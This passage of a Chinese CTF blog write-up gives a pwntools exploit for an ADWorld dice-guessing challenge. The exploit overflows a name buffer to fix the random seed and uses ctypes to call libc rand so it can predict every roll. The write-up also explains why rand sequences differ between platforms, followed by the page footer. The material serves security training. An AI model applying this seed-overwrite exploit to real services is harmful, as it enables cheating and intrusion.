+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#conding=utf-8 </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">z = remote(<span class="string">'124.126.19.106'</span>,<span class="number">37861</span>)</span><br><span class="line"><span class="comment">#z = process('./game')</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x40</span> + <span class="string">'a'</span> * <span class="number">4</span></span><br><span class="line">z.recvuntil(<span class="string">"Welcome, let me know your name: "</span>)</span><br><span class="line">z.sendline(payload)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">0x61616161</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	z.recvuntil(<span class="string">"Give me the point(1~6):"</span>)</span><br><span class="line">	num = (libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">	z.sendline(str(num))</span><br><span class="line">print(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">z.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里有两个需要注意的点：</p>
+<ul>
+<li></li>
+<li></li>
+</ul>
+<p>除了以上两点，还有两点是：</p>
+<ol>
+<li><p><code>ctypes模块</code>：ctypes是python下的一个可以链接c/c++的一个库。</p>
+<p>可以将C函数编译成动态链接库, 即window下的.dll文件或者是linux下的.so文件.</p>
+<p>可以调用c/c++，做一些python不能做的事情。例如对硬件操作，快速计算，操作内存。</p>
+<p>官方文档定义为：<a href="https://docs.python.org/2/library/ctypes.html#module-ctypes" target="_blank" rel="noopener"><code>ctypes</code></a> is a foreign function library for Python. It provides C compatible data types, and allows calling functions in DLLs or shared libraries. It can be used to wrap these libraries in pure Python.</p>
+</li>
+<li><p><del>重大</del>发现:</p>
+<p>既然已经控制随机种子，那么可以试试手动拿旗，用C++列出它的伪随机序列</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ran_num;</span><br><span class="line">srand(<span class="number">0x61616161</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">ran_num=rand() % <span class="number">6</span>+<span class="number">1</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是，结果和debug中显示的序列完全不同，反复实验多次，最后Google了解到，由于Windows和Linux平台下该函数的实现方法不同，因此获得的结果也不同，实际上，不同平台之间，只是都能保证随机序列在0到RAND_MAX之间，其他的都是平台各自具体的实现方法。实操结果如下（Ubuntu上显示的为该程序的序列）</p>
+<p><img src="https://i.loli.net/2020/06/01/CBmDiJf89XK1wFq.png" alt=""></p>
+</li>
+</ol>
+<hr>
+<p>最终结果如下：</p>
+<img src="https://i.loli.net/2020/06/01/gr5XB6uqc8lIOYs.png" style="zoom: 67%;" />
+
+<p>其实有点像新手区的猜数字游戏的题目ε=ε=ε=(<del>￣▽￣)</del></p>
+<hr>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://ld1ng.com/2020/06/02/ADWorld-pwn/" title="ADWorld-PWN  (updating..)">http://ld1ng.com/2020/06/02/ADWorld-pwn/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ld1ng" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/liding.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ld1ng" target="_blank"><span class="text-dark">Ld1ng</span><small class="ml-1x">Student</small></a></h3>
+        <div>Primary school students majoring in information security.</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2020/05/25/bugku-pwn5/" title="BugkuCTF pwn5"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
+        <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/ipay.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechat.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ld1ng" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://weibo.com/5580147545/profile?" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/Liding10763325" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2020 Ld1ng
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/ld1ng" target="_blank"> ld1ng </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'axhOjPzscogBppPjn36rtaAv-gzGzoHsz',
+    appKey: 'gMB6OHiHJvIxpnVtuoYxyPhk',
+    placeholder: 'Just go go',
+    avatar: 'wavatar',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+
+
+</body>
+</html>
